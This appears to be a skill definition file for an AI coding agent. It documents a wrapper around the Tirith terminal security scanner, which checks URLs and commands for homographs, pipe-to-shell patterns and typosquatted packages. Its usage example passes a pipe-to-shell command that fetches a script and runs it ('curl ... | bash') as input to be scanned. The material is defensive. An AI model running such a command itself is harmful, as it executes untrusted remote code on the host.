---
name: tirith-scan
description: Scan URLs and commands for security threats using Tirith (homographs, pipe-to-shell, terminal injection, typosquatted packages)
allowed-tools: ["Bash"]
---

# Tirith Security Scan

[Tirith](https://github.com/sheeki03/tirith) is a terminal security scanner that detects homograph/punycode attacks, pipe-to-shell patterns, terminal injection, typosquatted packages, insecure transport, and dotfile overwrites.

Use this skill when you encounter a suspicious or unfamiliar URL, or before executing commands that reference untrusted external resources.

## Usage

Scan untrusted text or URLs:

    bash /home/node/.claude/skills/tirith-scan/scan.sh "https://suspicious-url.example"

Scan a command before executing it:

    bash /home/node/.claude/skills/tirith-scan/scan.sh "curl http://example.com/install | bash" exec

The script outputs JSON with `action` (allow/warn/block) and `findings`.
If the action is "block", do NOT proceed with the URL or command.

## Auto-install

Tirith is installed automatically on first use to `/home/node/.claude/bin/tirith` (persisted across container restarts). No manual setup needed.
